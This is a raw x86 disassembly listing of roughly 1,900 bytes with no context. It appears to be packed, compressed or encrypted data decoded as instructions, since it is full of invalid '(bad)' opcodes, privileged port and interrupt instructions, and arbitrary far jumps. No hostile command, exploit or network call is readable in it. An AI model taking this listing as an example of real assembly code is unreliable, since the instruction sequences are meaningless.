  41f566:	or     cl,BYTE PTR [ecx-0x1ef3ad27]
  41f56c:	scas   al,BYTE PTR es:[edi]
  41f56d:	mov    DWORD PTR [ebp-0x20],edx
  41f570:	ins    DWORD PTR es:[edi],dx
  41f571:	nop
  41f572:	icebp  
  41f573:	js     0x41f55f
  41f575:	stc    
  41f576:	stos   BYTE PTR es:[edi],al
  41f577:	mov    ds:0x857474d0,eax
  41f57c:	(bad)  
  41f57d:	mov    bh,0x70
  41f57f:	cmp    esi,DWORD PTR [ebp-0x34]
  41f582:	mov    fs,esp
  41f584:	(bad)  
  41f585:	jmp    0x6c9dbbb7
  41f58a:	in     al,0xb
  41f58c:	cli    
  41f58d:	into   
  41f58e:	in     al,0xec
  41f590:	test   DWORD PTR [edx],edx
  41f592:	jp     0x41f5a0
  41f594:	mov    al,0xd4
  41f596:	push   ebx
  41f597:	pop    ss
  41f598:	push   esp
  41f599:	and    DWORD PTR [edi+0x7dad90df],ebx
  41f59f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5a0:	ja     0x41f529
  41f5a2:	xchg   DWORD PTR [eax+0x9],ecx
  41f5a5:	imul   ebx,DWORD PTR [ebx+0x6e58409d],0x1dc479c3
  41f5af:	test   DWORD PTR [edi],edx
  41f5b1:	mov    ds:0x86176d44,al
  41f5b6:	mov    ebx,0x5677bbfe
  41f5bb:	inc    edx
  41f5bc:	(bad)  [edi-0x5e]
  41f5bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5c0:	pop    esp
  41f5c1:	or     ch,BYTE PTR [ebp-0x5d45c8dc]
  41f5c7:	xchg   edi,eax
  41f5c8:	inc    edi
  41f5c9:	xchg   DWORD PTR [ecx-0x749d5fbb],ebp
  41f5cf:	leave  
  41f5d0:	lods   al,BYTE PTR ds:[esi]
  41f5d1:	xchg   edx,eax
  41f5d2:	adc    DWORD PTR [edi],edx
  41f5d4:	cmp    eax,0xe40db3db
  41f5d9:	cld    
  41f5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5db:	jbe    0x41f643
  41f5dd:	push   cs
  41f5de:	sbb    DWORD PTR [eax+0x3b],ebx
  41f5e1:	pop    ecx
  41f5e2:	or     BYTE PTR [eax+0x6e],dl
  41f5e5:	test   al,0x77
  41f5e7:	popf   
  41f5e8:	jns    0x41f5d0
  41f5ea:	nop
  41f5eb:	and    esp,DWORD PTR [ecx-0x55]
  41f5ee:	dec    eax
  41f5ef:	xlat   BYTE PTR ds:[ebx]
  41f5f0:	push   ss
  41f5f1:	mov    esp,0xe55a464a
  41f5f6:	adc    al,0x82
  41f5f8:	sub    cl,BYTE PTR [ebp-0x5517cf83]
  41f5fe:	push   ss
  41f5ff:	mov    esi,0x68a1292e
  41f604:	cli    
  41f605:	in     eax,dx
  41f606:	fistp  WORD PTR [edx-0x1921f829]
  41f60c:	and    eax,0xc94af36c
  41f612:	mov    DWORD PTR [ecx-0x9],ebx
  41f615:	cli    
  41f616:	dec    edi
  41f617:	mov    ds:0x8df65ff5,eax
  41f61c:	mov    al,0xbe
  41f61e:	jno    0x41f5e4
  41f620:	call   0x429:0xa1701ff0
  41f627:	sahf   
  41f628:	mov    ebx,edi
  41f62a:	jmp    DWORD PTR [ecx+0x615374fc]
  41f630:	push   esi
  41f631:	jb     0x41f67e
  41f633:	and    cl,bh
  41f635:	inc    edi
  41f636:	mov    dh,0x56
  41f638:	bound  edi,QWORD PTR [ecx]
  41f63a:	mov    ah,0xcc
  41f63c:	in     eax,dx
  41f63d:	sbb    al,0x5e
  41f63f:	or     edi,esi
  41f641:	mov    al,0x89
  41f643:	jmp    0x41f699
  41f645:	inc    edx
  41f646:	dec    ecx
  41f647:	shl    DWORD PTR [ebx],1
  41f649:	jle    0x41f6b3
  41f64b:	cli    
  41f64c:	pop    es
  41f64d:	dec    eax
  41f64e:	pop    ds
  41f64f:	mov    cl,0x91
  41f651:	in     eax,0xad
  41f653:	xor    edx,DWORD PTR [ecx+esi*1-0xf]
  41f657:	or     BYTE PTR [ebp+0x5b],0xcb
  41f65b:	enter  0xb1e0,0xf
  41f65f:	jno    0x41f5e4
  41f661:	add    ecx,ebx
  41f663:	fmul   DWORD PTR [ecx-0x23edb857]
  41f669:	out    dx,al
  41f66a:	aaa    
  41f66b:	cmp    cl,cl
  41f66d:	std    
  41f66e:	dec    edx
  41f66f:	(bad)  
  41f670:	sbb    eax,0x48c2d5da
  41f675:	aas    
  41f676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f677:	loope  0x41f6a3
  41f679:	add    BYTE PTR [esi-0xe168652],0x2e
  41f680:	mov    bh,0xca
  41f682:	push   edi
  41f683:	repz sub eax,0xfbb92a0
  41f689:	adc    al,0x1f
  41f68b:	jge    0x41f6c8
  41f68d:	out    0xb,eax
  41f68f:	xchg   ebp,eax
  41f690:	fstp   DWORD PTR [edx-0x3b]
  41f693:	imul   ebp,DWORD PTR [ebx-0x3b14ca16],0xffffffaf
  41f69a:	inc    edx
  41f69b:	fstp   QWORD PTR [ebx]
  41f69d:	dec    esi
  41f69e:	adc    al,0x95
  41f6a0:	dec    ebx
  41f6a1:	or     al,0xe6
  41f6a3:	dec    eax
  41f6a4:	jle    0x41f67e
  41f6a6:	out    0x3c,eax
  41f6a8:	in     al,0x90
  41f6aa:	mov    cl,0xe0
  41f6ac:	xor    DWORD PTR [esi],ebp
  41f6ae:	fisttp WORD PTR [ebx+edx*2]
  41f6b1:	inc    esi
  41f6b2:	mov    ds,WORD PTR [esi+0xe40e19]
  41f6b8:	push   ebp
  41f6b9:	add    al,0xfe
  41f6bb:	ficomp DWORD PTR [edi]
  41f6bd:	push   eax
  41f6be:	sub    ch,dh
  41f6c0:	lock sbb dl,ah
  41f6c3:	adc    eax,0x10fff2bf
  41f6c8:	retf   
  41f6c9:	or     al,0xa
  41f6cb:	aam    0x4a
  41f6cd:	rcr    DWORD PTR [ebx],0xd
  41f6d0:	imul   ebx,DWORD PTR [edx+0x7e],0x5383f5eb
  41f6d7:	(bad)  
  41f6d8:	test   DWORD PTR [esp+ebx*1-0x2f],0xdee59c12
  41f6e0:	inc    esi
  41f6e1:	jmp    0xdcdb5b42
  41f6e6:	cld    
  41f6e7:	cmp    edx,DWORD PTR [edx+0x224e1851]
  41f6ed:	lds    ebx,FWORD PTR [ebx-0x66]
  41f6f0:	cmp    ah,ah
  41f6f2:	sub    BYTE PTR [edx-0x79],ch
  41f6f5:	into   
  41f6f6:	or     esp,esi
  41f6f8:	mov    ds:0xe6f526eb,eax
  41f6fd:	out    0x61,eax
  41f6ff:	cld    
  41f700:	cld    
  41f701:	inc    eax
  41f703:	sub    al,0x7d
  41f705:	or     esi,DWORD PTR [eax]
  41f707:	loope  0x41f74c
  41f709:	pop    ss
  41f70a:	and    ecx,esi
  41f70c:	dec    esi
  41f70d:	push   ebp
  41f70e:	imul   esi,DWORD PTR [edi+0x772ef950],0xffffffb6
  41f715:	into   
  41f716:	jl     0x41f795
  41f718:	mov    ebx,0x173c6314
  41f71d:	int    0xc1
  41f71f:	pop    es
  41f720:	(bad)  [eax-0x1b]
  41f723:	mov    cl,0xb4
  41f725:	mov    ebx,0x649cb7d3
  41f72a:	and    eax,0x2fd481c7
  41f72f:	mov    ebx,0x7b17832e
  41f734:	or     DWORD PTR [edi-0x55],edx
  41f737:	sbb    al,0x15
  41f739:	sub    eax,0x7e649791
  41f73e:	(bad)  
  41f73f:	pop    ebp
  41f740:	jmp    0x3485:0x47972dd9
  41f747:	push   eax
  41f748:	pop    es
  41f749:	or     DWORD PTR [ecx-0x2e],esp
  41f74c:	sbb    esi,DWORD PTR [ebx+esi*2]
  41f74f:	mov    ah,0xf1
  41f751:	icebp  
  41f752:	test   al,0x64
  41f754:	test   al,0x31
  41f756:	inc    esp
  41f757:	jne    0x41f756
  41f759:	jmp    0x6aaf8370
  41f75e:	xchg   ecx,eax
  41f75f:	add    edi,0xcfc5e6b2
  41f765:	xchg   edx,eax
  41f766:	js     0x41f6fb
  41f768:	xor    eax,0xf03c7282
  41f76d:	(bad)  
  41f76f:	pop    esi
  41f770:	(bad)  
  41f771:	and    eax,0x17ed20d8
  41f776:	mov    al,0x61
  41f778:	push   ds
  41f779:	inc    esp
  41f77a:	std    
  41f77b:	sahf   
  41f77c:	xor    DWORD PTR [ebp-0x64],edi
  41f77f:	inc    ecx
  41f780:	mov    bl,0x55
  41f782:	jg     0x41f7c1
  41f784:	outs   dx,DWORD PTR ds:[esi]
  41f785:	dec    edi
  41f786:	scas   eax,DWORD PTR es:[edi]
  41f787:	stc    
  41f788:	outs   dx,DWORD PTR ds:[esi]
  41f789:	gs das 
  41f78b:	lods   al,BYTE PTR ds:[esi]
  41f78c:	inc    ecx
  41f78d:	adc    al,0xe1
  41f78f:	or     edx,DWORD PTR [edx-0x7e2d03dd]
  41f795:	sahf   
  41f796:	dec    edx
  41f797:	inc    edi
  41f798:	jo     0x41f792
  41f79a:	dec    eax
  41f79b:	clc    
  41f79c:	mov    esp,0x6957cc0f
  41f7a1:	cdq    
  41f7a2:	mov    ds,WORD PTR [edi+0x416985d3]
  41f7a8:	mov    fs,WORD PTR [ecx+0x79e519e3]
  41f7ae:	enter  0xd174,0x8a
  41f7b2:	gs ins DWORD PTR es:[edi],dx
  41f7b4:	cmp    edi,DWORD PTR ds:0xaaaa9622
  41f7ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7bb:	push   ebx
  41f7bc:	out    dx,eax
  41f7bd:	bound  edi,QWORD PTR [ebx]
  41f7bf:	jle    0x41f79e
  41f7c1:	pop    ds
  41f7c2:	xchg   BYTE PTR [esi],bl
  41f7c4:	inc    eax
  41f7c5:	push   edx
  41f7c6:	sbb    esi,DWORD PTR [edx]
  41f7c8:	aad    0x4d
  41f7ca:	cmp    bh,BYTE PTR ds:0xf2559c9e
  41f7d0:	not    bl
  41f7d2:	(bad)  
  41f7d3:	leave  
  41f7d4:	lods   al,BYTE PTR ds:[esi]
  41f7d5:	test   eax,0xdf4fe4b
  41f7da:	jp     0x41f767
  41f7dc:	cmp    eax,0x7fc17b56
  41f7e1:	aad    0x73
  41f7e3:	popa   
  41f7e4:	iret   
  41f7e5:	fnstenv [edx+0x4b9565e1]
  41f7eb:	enter  0x2899,0x6e
  41f7ef:	(bad)  
  41f7f0:	fsubr  QWORD PTR [edi+0x59]
  41f7f3:	or     esi,DWORD PTR [eax]
  41f7f5:	jnp    0x41f7c4
  41f7f7:	in     al,0x39
  41f7f9:	ror    BYTE PTR [ecx+0x60273d70],1
  41f7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f800:	and    DWORD PTR [ecx+0xe4c3214],eax
  41f806:	inc    esp
  41f807:	mov    bh,BYTE PTR ds:0xc1c65853
  41f80d:	lods   eax,DWORD PTR ds:[esi]
  41f80e:	je     0x41f7b4
  41f810:	jmp    0xd8be673c
  41f815:	or     cl,BYTE PTR [eax]
  41f817:	push   eax
  41f818:	add    ebx,edx
  41f81a:	xchg   ebp,eax
  41f81b:	dec    ecx
  41f81c:	pop    edx
  41f81d:	lds    ecx,FWORD PTR [esi]
  41f81f:	out    dx,al
  41f820:	das    
  41f821:	add    edx,edx
  41f823:	fistp  DWORD PTR [si+0x55]
  41f827:	cmp    eax,0x1240143d
  41f82c:	ss popa 
  41f82e:	scas   al,BYTE PTR es:[edi]
  41f82f:	or     ah,dl
  41f831:	push   esp
  41f832:	pop    ds
  41f833:	sbb    al,0xc2
  41f835:	lahf   
  41f836:	add    al,BYTE PTR [edi+0xbe1426f]
  41f83c:	not    DWORD PTR [eax]
  41f83e:	add    BYTE PTR [eax],dh
  41f840:	push   esp
  41f841:	int3   
  41f842:	addr16 sar bl,cl
  41f845:	fdivr  st,st(6)
  41f848:	mov    db5,eax
  41f84b:	ret    0x262f
  41f84e:	adc    al,bl
  41f850:	(bad)
  41f854:	mov    cl,0xfb
  41f856:	daa    
  41f857:	and    al,0x20
  41f859:	iret   
  41f85a:	cmp    DWORD PTR [esi+0x5c],edi
  41f85d:	dec    ebx
  41f85e:	ja     0x41f8a9
  41f860:	imul   edi,DWORD PTR [ebx-0x1b],0xffffffa0
  41f864:	push   ss
  41f865:	fbld   TBYTE PTR [ecx+eax*4-0x6d]
  41f869:	inc    ecx
  41f86a:	push   es
  41f86b:	dec    edx
  41f86c:	loope  0x41f852
  41f86e:	test   BYTE PTR [ebp+0x1b],al
  41f871:	mov    dl,0x85
  41f873:	fistp  QWORD PTR [edi]
  41f875:	ss pop edx
  41f877:	cmp    DWORD PTR [ecx+0x6e75903e],ebx
  41f87d:	call   0x2b44:0xed93daf
  41f884:	dec    eax
  41f885:	mov    cl,0xc1
  41f887:	push   ecx
  41f888:	push   ss
  41f889:	fdivr  st,st(0)
  41f88b:	sbb    ch,dl
  41f88d:	jmp    0xc7bd:0x21f40183
  41f894:	mov    edx,0xa1a1ab09
  41f899:	pop    edx
  41f89a:	add    ebp,edi
  41f89c:	jecxz  0x41f8f5
  41f89e:	ror    BYTE PTR [edi+0xe],0xc5
  41f8a2:	test   DWORD PTR [ecx-0x17420123],0x8fa48a90
  41f8ac:	pop    ecx
  41f8ad:	retf   
  41f8ae:	arpl   WORD PTR [ebp+eax*1+0x4a],si
  41f8b2:	mov    DWORD PTR [esi-0x3f8c50bb],ebx
  41f8b8:	out    0x59,eax
  41f8ba:	jns    0x41f903
  41f8bc:	fldcw  WORD PTR [ecx*4+0xf3eb762]
  41f8c3:	inc    eax
  41f8c4:	loop   0x41f899
  41f8c6:	mul    ebx
  41f8c8:	or     esi,DWORD PTR [edx-0x66]
  41f8cb:	fwait
  41f8cc:	sub    bh,ch
  41f8ce:	or     al,0xd7
  41f8d0:	sbb    esi,DWORD PTR [ebx+0x23]
  41f8d3:	pop    ebx
  41f8d4:	mov    edx,DWORD PTR ss:[edi-0x30]
  41f8d8:	dec    ebx
  41f8d9:	neg    bh
  41f8db:	pop    ss
  41f8dc:	lods   eax,DWORD PTR ds:[esi]
  41f8dd:	xchg   BYTE PTR [ecx+0x7b41adde],al
  41f8e3:	and    al,0x20
  41f8e5:	inc    edx
  41f8e6:	aaa    
  41f8e7:	icebp  
  41f8e8:	ins    DWORD PTR es:[edi],dx
  41f8e9:	fdivr  DWORD PTR [edx-0x20]
  41f8ec:	fs stc 
  41f8ee:	les    esi,FWORD PTR [eax]
  41f8f0:	push   edx
  41f8f1:	into   
  41f8f2:	adc    esi,DWORD PTR [edi]
  41f8f4:	loopne 0x41f8c0
  41f8f6:	add    dh,BYTE PTR [esi-0x8]
  41f8f9:	pusha  
  41f8fa:	sub    edx,DWORD PTR [eax+0x4c]
  41f8fd:	cs (bad) 
  41f8ff:	mov    ds:0xbe5bf77a,eax
  41f904:	test   BYTE PTR [ecx+0x36],0x88
  41f908:	repz cwde 
  41f90a:	add    edi,eax
  41f90c:	iret   
  41f90d:	mov    al,ds:0x23b0041b
  41f912:	shr    DWORD PTR [ebp+0x4d],0xb2
  41f916:	push   0xffffff91
  41f918:	outs   dx,DWORD PTR ds:[esi]
  41f919:	stos   BYTE PTR es:[edi],al
  41f91a:	mov    WORD PTR [ecx-0xa7e6ad9],fs
  41f920:	mov    bl,0x80
  41f922:	add    eax,0x5794b81e
  41f927:	outs   dx,BYTE PTR ds:[esi]
  41f928:	ins    BYTE PTR es:[edi],dx
  41f929:	mov    al,ds:0xa296e4b4
  41f92e:	jge    0x41f975
  41f930:	pop    edi
  41f931:	enter  0xd657,0xdd
  41f935:	dec    ebx
  41f936:	mov    ds:0x9b48f2e6,al
  41f93b:	jge    0x41f956
  41f93d:	sub    eax,0x1608c9db
  41f942:	mov    al,BYTE PTR [edi+esi*4+0x3a]
  41f946:	add    ah,al
  41f948:	rcl    BYTE PTR ds:0x62df1d87,0x7
  41f94f:	sub    eax,0x29f1b0cf
  41f954:	or     eax,0x4c9bc14f
  41f959:	add    edi,esi
  41f95b:	test   BYTE PTR [ecx+0x6ebf1b2e],dh
  41f961:	xchg   ebx,eax
  41f962:	or     eax,0x6bcfa04f
  41f967:	mov    edi,0x7187e109
  41f96c:	or     al,0x9a
  41f96e:	stos   BYTE PTR es:[edi],al
  41f96f:	ret    0x744a
  41f972:	fisttp QWORD PTR [edx-0x9]
  41f975:	(bad)  
  41f977:	fwait
  41f978:	dec    ecx
  41f979:	mov    edi,0x9e4b1a6a
  41f97e:	fnstenv [esi+0x31db0bb5]
  41f984:	pop    ecx
  41f985:	fcom   QWORD PTR [edx+0x58b326ba]
  41f98b:	push   ecx
  41f98c:	ins    DWORD PTR es:[edi],dx
  41f98d:	test   eax,0xdfcdf91a
  41f992:	jb     0x41f98d
  41f994:	rcr    ebx,1
  41f996:	xor    ecx,0xffffffc1
  41f999:	cdq    
  41f99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99b:	push   ecx
  41f99c:	dec    esi
  41f99d:	and    esi,DWORD PTR [esi]
  41f99f:	dec    ebp
  41f9a0:	jns    0x41f942
  41f9a2:	fisubr WORD PTR [edi-0x3566d1dc]
  41f9a8:	inc    edx
  41f9a9:	push   ecx
  41f9aa:	sub    al,0x8d
  41f9ac:	push   esp
  41f9ad:	mov    ds:0x4f475007,al
  41f9b2:	pushf  
  41f9b3:	pop    esi
  41f9b4:	nop
  41f9b5:	shl    dl,1
  41f9b7:	inc    edi
  41f9b8:	pop    ds
  41f9b9:	inc    esi
  41f9ba:	mov    ah,0x55
  41f9bc:	xor    eax,0x6391e3f2
  41f9c1:	mov    eax,0xe391ad0
  41f9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9c7:	add    al,0xc
  41f9c9:	adc    BYTE PTR [ebp-0x41d18a63],bh
  41f9cf:	ins    BYTE PTR es:[edi],dx
  41f9d0:	pop    ds
  41f9d1:	dec    esi
  41f9d2:	(bad)  
  41f9d3:	sar    BYTE PTR [edi+edi*8+0x2d506b75],0x87
  41f9db:	jb     0x41f9e8
  41f9dd:	and    bl,BYTE PTR [edx-0x3f]
  41f9e0:	fcos   
  41f9e2:	and    DWORD PTR [eax-0x146cdb52],ecx
  41f9e8:	lock inc edi
  41f9ea:	dec    edx
  41f9eb:	mov    dh,0xc0
  41f9ed:	cli    
  41f9ee:	mov    eax,0xba8ebd3b
  41f9f3:	mov    esp,0xb3ba6668
  41f9f8:	scas   al,BYTE PTR es:[edi]
  41f9f9:	and    DWORD PTR [ebx],0xffffffc2
  41f9fc:	call   0x8bf20cf8
  41fa01:	daa    
  41fa02:	por    mm4,QWORD PTR [ecx-0x5f]
  41fa06:	lods   eax,DWORD PTR ds:[esi]
  41fa07:	lock loopne 0x41fa29
  41fa0a:	shl    BYTE PTR [esi],0x5b
  41fa0d:	push   edi
  41fa0e:	les    ecx,FWORD PTR [esi-0x15]
  41fa11:	icebp  
  41fa12:	add    ah,bh
  41fa14:	loopne 0x41f9e5
  41fa16:	fisubr WORD PTR [ebx-0x9271211]
  41fa1c:	push   cs
  41fa1d:	idiv   DWORD PTR [eax-0x64]
  41fa20:	cwde   
  41fa21:	hlt    
  41fa22:	aaa    
  41fa23:	inc    edx
  41fa24:	in     al,0x26
  41fa26:	mov    ds:0xfa07f150,al
  41fa2b:	sub    DWORD PTR [ebx+0x94a1df9],esi
  41fa31:	mov    ecx,0xdc64bd7a
  41fa36:	dec    ecx
  41fa37:	adc    cl,bl
  41fa39:	xchg   edx,eax
  41fa3a:	mov    dh,0x1c
  41fa3c:	or     eax,0x9109a41f
  41fa41:	hlt    
  41fa42:	dec    ecx
  41fa43:	ins    DWORD PTR es:[edi],dx
  41fa44:	shr    DWORD PTR [edx],cl
  41fa46:	daa    
  41fa47:	sub    al,0xc6
  41fa49:	jae    0x41fa66
  41fa4b:	in     eax,dx
  41fa4c:	sub    bh,BYTE PTR [edx]
  41fa4e:	mov    al,0x54
  41fa50:	jp     0x41fabd
  41fa52:	out    dx,eax
  41fa53:	mov    WORD PTR [edi+0x2a],fs
  41fa56:	addr16 inc edx
  41fa58:	jp     0x41f9f7
  41fa5a:	ret    0x8e79
  41fa5d:	pop    ecx
  41fa5e:	pusha  
  41fa5f:	imul   ebp,edx,0xffffff90
  41fa62:	xor    al,0xa4
  41fa64:	pop    eax
  41fa65:	add    esp,ecx
  41fa67:	push   esi
  41fa68:	jecxz  0x41fa95
  41fa6a:	test   eax,0x5c7b9676
  41fa6f:	(bad)  
  41fa70:	cmc    
  41fa71:	mov    esp,0xbff7a1c
  41fa76:	test   esi,0x98a5f146
  41fa7c:	fs dec ebp
  41fa7e:	es pop esp
  41fa80:	mov    esi,0x3f79696d
  41fa85:	out    0xb,eax
  41fa87:	test   BYTE PTR [eax],dl
  41fa89:	loopne 0x41fa4e
  41fa8b:	adc    cl,BYTE PTR [ebx-0x5231523d]
  41fa91:	and    eax,0x647c29fc
  41fa96:	cmp    esp,edx
  41fa98:	and    ebp,DWORD PTR [esi-0x4e0cbbb5]
  41fa9e:	push   esp
  41fa9f:	or     al,0x4a
  41faa1:	(bad)  
  41faa3:	rol    BYTE PTR [eax-0x6550b248],1
  41faa9:	sbb    al,0xf0
  41faab:	jne    0x41fa92
  41faad:	pusha  
  41faae:	outs   dx,DWORD PTR ds:[esi]
  41faaf:	xor    al,0x54
  41fab1:	mov    BYTE PTR ds:0x7e8b2b90,bl
  41fab7:	and    dh,BYTE PTR [ecx+0x0]
  41faba:	mov    ds:0x78851ec7,eax
  41fabf:	test   al,0x10
  41fac1:	mov    WORD PTR [edx-0x46],?
  41fac4:	neg    BYTE PTR [eax+0x279ff643]
  41faca:	(bad)  
  41facb:	push   ebx
  41facc:	mov    BYTE PTR [edi-0x7636ed14],al
  41fad2:	jns    0x41fb3f
  41fad4:	mov    ecx,0xef54000b
  41fad9:	ret    0x5cf6
  41fadc:	and    ah,dl
  41fade:	int    0xc9
  41fae0:	mov    esi,0x3c358428
  41fae5:	jae    0x41fa8d
  41fae7:	nop
  41fae8:	mov    ebp,?
  41faea:	mov    dl,0x9d
  41faec:	add    DWORD PTR [ecx+0x7e],0xd51cf8e8
  41faf3:	adc    dh,BYTE PTR [edx]
  41faf5:	lock mov cl,0x9b
  41faf8:	(bad)  
  41faf9:	iret   
  41fafa:	add    BYTE PTR [esi+0x65af60f8],0xaa
  41fb01:	sub    bl,bh
  41fb03:	sub    eax,0x2e1a40be
  41fb08:	aad    0xea
  41fb0a:	sbb    cl,0xa6
  41fb0d:	scas   al,BYTE PTR es:[edi]
  41fb0e:	imul   edi,DWORD PTR [ebp-0x46533b74],0x48
  41fb15:	inc    esp
  41fb16:	(bad)  
  41fb18:	vpaddb ymm2,ymm1,ymm1
  41fb1c:	inc    eax
  41fb1d:	push   ecx
  41fb1e:	lods   eax,DWORD PTR ds:[esi]
  41fb1f:	not    edx
  41fb21:	mov    esp,0x5bfa43bd
  41fb26:	das    
  41fb27:	mov    edi,0x68a9c71e
  41fb2c:	cmp    BYTE PTR [ecx-0x75],al
  41fb2f:	stos   BYTE PTR es:[edi],al
  41fb30:	push   es
  41fb31:	and    al,BYTE PTR [ecx+esi*1+0x49f1ae6b]
  41fb38:	jb     0x41fb63
  41fb3a:	test   DWORD PTR [ebx-0x68],esp
  41fb3d:	repz lock xchg ebx,eax
  41fb40:	cmp    esi,ebx
  41fb42:	icebp  
  41fb43:	mov    cl,0x9e
  41fb45:	(bad)  
  41fb46:	int    0x4d
  41fb48:	fld    DWORD PTR ds:0xc964e665
  41fb4e:	rcr    DWORD PTR [ebp-0x24df7290],0xcc
  41fb55:	jmp    0x5c8ce39b
  41fb5a:	and    DWORD PTR [ecx],ebx
  41fb5c:	(bad)  
  41fb5d:	push   edx
  41fb5e:	je     0x41fb0a
  41fb60:	xchg   edx,eax
  41fb61:	mov    DWORD PTR [ebx+0x233bdca3],ebp
  41fb67:	xchg   DWORD PTR [ecx+ebx*2-0x1544e9cb],edi
  41fb6e:	scas   al,BYTE PTR es:[edi]
  41fb6f:	and    bl,bh
  41fb71:	mov    eax,ds:0x45b23a97
  41fb76:	jmp    0xa72c:0x9e99a577
  41fb7d:	adc    DWORD PTR [edx-0x22b33e1c],ebp
  41fb83:	xchg   ecx,eax
  41fb84:	jp     0x41fbe0
  41fb86:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41fb88:	fcmovu st,st(1)
  41fb8a:	or     al,0x46
  41fb8c:	lahf   
  41fb8d:	lock shl DWORD PTR ds:0x35f51ee4,1
  41fb94:	push   ss
  41fb95:	sub    BYTE PTR [esi-0x5],bl
  41fb98:	out    0x17,eax
  41fb9a:	aad    0x4
  41fb9c:	add    DWORD PTR [esi],0xafdd3469
  41fba2:	imul   edi,esi,0x928dcd8
  41fba8:	stos   DWORD PTR es:[edi],eax
  41fba9:	fimul  WORD PTR [ebx-0x3bfe57bd]
  41fbaf:	sbb    bl,BYTE PTR [ebx-0x19e9f0ea]
  41fbb5:	(bad)  
  41fbb6:	out    dx,eax
  41fbb7:	loop   0x41fbf1
  41fbb9:	push   esp
  41fbba:	xor    BYTE PTR [bp+di+0x6],al
  41fbbe:	cs call 0xc327:0x44bf739
  41fbc6:	cld    
  41fbc7:	test   BYTE PTR [eax+0x67871838],ah
  41fbcd:	das    
  41fbce:	xchg   ebp,eax
  41fbcf:	(bad)  
  41fbd0:	mov    eax,0xf30e3e42
  41fbd5:	lock mov bl,0xb9
  41fbd8:	sahf   
  41fbd9:	mov    cl,0x70
  41fbdb:	sar    BYTE PTR [ecx-0x69],0x2d
  41fbdf:	cwde   
  41fbe0:	mov    BYTE PTR [edx-0x33],ah
  41fbe3:	(bad)  
  41fbe4:	fnsave [esi+0x1cf366f6]
  41fbea:	mov    WORD PTR [edi+0x589fb35a],?
  41fbf0:	or     dh,BYTE PTR [edx]
  41fbf2:	and    BYTE PTR [eax],cl
  41fbf4:	fdiv   QWORD PTR [edi]
  41fbf6:	push   esi
  41fbf7:	jno    0x41fc03
  41fbf9:	add    ecx,DWORD PTR [eax+0x550577b9]
  41fbff:	fldcw  WORD PTR [ebp+ebx*2+0x47]
  41fc03:	ficom  DWORD PTR [ecx-0x3afb755c]
  41fc09:	ins    BYTE PTR es:[edi],dx
  41fc0a:	iret   
  41fc0b:	fldenv [edx-0x6c]
  41fc0e:	fdiv   QWORD PTR [ebx]
  41fc10:	mov    dl,0x58
  41fc12:	hlt    
  41fc13:	cmp    BYTE PTR [edi-0x3a],cl
  41fc16:	fst    QWORD PTR [bx+di+0x3a]
  41fc1a:	scas   al,BYTE PTR es:[edi]
  41fc1b:	adc    ebp,DWORD PTR [eax-0x50]
  41fc1e:	adc    al,BYTE PTR [ecx]
  41fc20:	hlt    
  41fc21:	(bad)  
  41fc22:	repz (bad) 
  41fc24:	mov    ebx,gs
  41fc26:	jb     0x41fbd9
  41fc28:	cmp    bl,BYTE PTR [ebp-0x3d]
  41fc2b:	adc    esi,esi
  41fc2d:	stos   DWORD PTR es:[edi],eax
  41fc2e:	adc    bl,BYTE PTR ds:0xbb51fcf2
  41fc34:	pop    esi
  41fc35:	xchg   esp,eax
  41fc36:	and    BYTE PTR [eax-0x6c],dl
  41fc39:	sbb    ebx,DWORD PTR [eax+0x45]
  41fc3c:	cmp    al,0xcc
  41fc3e:	jmp    0x7f36:0x5136ead8
  41fc45:	test   eax,0x938606fc
  41fc4a:	imul   ecx,DWORD PTR [edx-0x76],0xec4a69b5
  41fc51:	jle    0x192c74f3
  41fc57:	mov    eax,0xd5595dbb
  41fc5c:	fld    DWORD PTR [ebx+0xf]
  41fc5f:	sbb    al,0x4
  41fc61:	or     bh,BYTE PTR [esi]
  41fc63:	sti    
  41fc64:	push   ss
  41fc65:	pop    ebx
  41fc66:	(bad)  
  41fc67:	xor    al,0x94
  41fc69:	jo     0x41fc79
  41fc6b:	mov    DWORD PTR [edi],ecx
  41fc6d:	hlt    
  41fc6e:	cmp    eax,0x7281e095
  41fc73:	ficomp WORD PTR [esi+0x18eddd4c]
  41fc79:	push   ecx
  41fc7a:	cmp    DWORD PTR [edi-0x7b55f14c],esp
  41fc80:	mov    al,ds:0x863163be
  41fc85:	mov    edx,0x859d736d
  41fc8a:	clc    
  41fc8b:	xlat   BYTE PTR ds:[ebx]
  41fc8c:	push   edi
  41fc8d:	nop
  41fc8e:	ds popf 
  41fc90:	mov    dl,0x6c
  41fc92:	out    0xa2,al
  41fc94:	rcr    BYTE PTR [edi+0x13],cl
  41fc97:	mov    dl,0xd0
  41fc99:	jecxz  0x41fc89
  41fc9b:	add    edx,edx
  41fc9d:	xchg   ebx,eax
  41fc9e:	shr    BYTE PTR [ecx+esi*8],cl
  41fca1:	inc    edi
  41fca2:	mov    ebx,0x96da8b2b
  41fca7:	push   ecx
  41fca8:	or     BYTE PTR [ebp+0x14],dh
  41fcab:	sub    ebx,DWORD PTR [esi+0x5b]
  41fcae:	adc    al,0xbb
  41fcb0:	je     0x41fd22
  41fcb2:	packsswb mm5,QWORD PTR [ecx+0x1496dd9]
  41fcb9:	jl     0x41fcf2
  41fcbb:	and    DWORD PTR [ebx+0x76],esi
  41fcbe:	sbb    al,0x1c
  41fcc0:	mov    esp,0x603cec28
  41fcc5:	cmc    
  41fcc6:	call   0x1871:0xc69e0693
  41fccd:	rol    BYTE PTR [ecx+ebx*8],0x5
  41fcd1:	push   edi
  41fcd2:	sar    BYTE PTR [edx+0x67],1
  41fcd5:	pop    ebx
  41fcd6:	fwait
  41fcd7:	sbb    DWORD PTR [ebx],ebx
  41fcd9:	data16 shr dh,0x82
  41fcdd:	and    BYTE PTR [eax],bl
  41fcdf:	loop   0x41fc8f
  41fce1:	stos   DWORD PTR es:[edi],eax
  41fce2:	add    DWORD PTR ds:0xffa5053a,eax
